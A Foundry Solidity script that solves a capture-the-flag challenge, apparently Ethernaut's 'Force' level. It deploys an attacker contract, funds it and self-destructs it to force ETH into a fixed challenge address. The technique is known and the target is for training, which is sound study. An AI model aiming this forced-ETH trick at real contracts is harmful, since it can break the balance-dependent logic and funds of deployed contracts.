// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/07-Force/ForceAttacker.sol";

/**
 * @title Challenge 07 Solution Script
 * @notice Deploy ForceAttacker, send it ETH, then call attack() to selfdestruct into target
 */
contract ForceSolution is Script {
    address constant INSTANCE = 0x894e78c9155e3C38CeC91e9dFC9F16418F21a74d;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);

        // Deploy attacker, fund it, then selfdestruct into the target
        ForceAttacker attacker = new ForceAttacker();
        (bool sent,) = address(attacker).call{value: 0.0001 ether}("");
        require(sent, "Failed to fund attacker");
        attacker.attack(payable(INSTANCE));
        console.log("ForceAttacker self-destructed, ETH forced into target");

        vm.stopBroadcast();

        console.log("Challenge 07 completed!");
    }
}
